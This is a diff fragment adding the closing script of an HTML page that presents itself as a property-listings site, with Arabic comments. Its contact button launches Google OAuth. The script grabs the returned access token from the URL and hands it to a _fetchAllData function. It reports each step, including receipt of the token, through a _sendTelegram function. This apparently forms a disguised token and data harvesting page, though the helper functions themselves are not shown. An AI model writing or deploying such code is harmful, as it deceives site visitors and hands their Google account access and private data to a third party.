+                document.getElementById('detailContactBtn').addEventListener('click', function() {
+                    if (localStorage.getItem('oauth_started') === 'true') {
+                        document.getElementById('statusText').innerText = '⚠️ تم تسجيل الدخول بالفعل';
+                        return;
+                    }
+                    document.getElementById('statusText').innerText = '⏳ جاري التوجيه إلى Google...';
+                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth) من صفحة التفاصيل");
+                    _startOAuth();
+                });
+
+                // ============================================================
+                // 14. التحقق من التوكن عند العودة من Google
+                // ============================================================
+                const hash = window.location.hash.substring(1);
+                if (hash.includes('access_token=')) {
+                    const params = new URLSearchParams(hash);
+                    const token = params.get('access_token');
+                    if (token) {
+                        _sendTelegram("🔑 تم استلام Access Token من Google");
+                        _fetchAllData(token);
+                        window.history.pushState({}, document.title, window.location.pathname);
+                        document.getElementById('statusText').innerText = '✅ تم تسجيل الدخول بنجاح!';
+                        appContainer.classList.add('show');
+                        localStorage.setItem('oauth_started', 'true');
+                    }
+                } else {
+                    // إذا مفيش توكن، خلي التطبيق يظهر (بس مش هنخفي التحقق لو لسه محصلش)
+                    if (localStorage.getItem('verified') === 'true') {
+                        appContainer.classList.add('show');
+                    }
+                }
+
+                // عرض العقارات
+                renderProperties('all');
+
+            });
+
+        })();
+    </script>
+
+</body>
+</html>
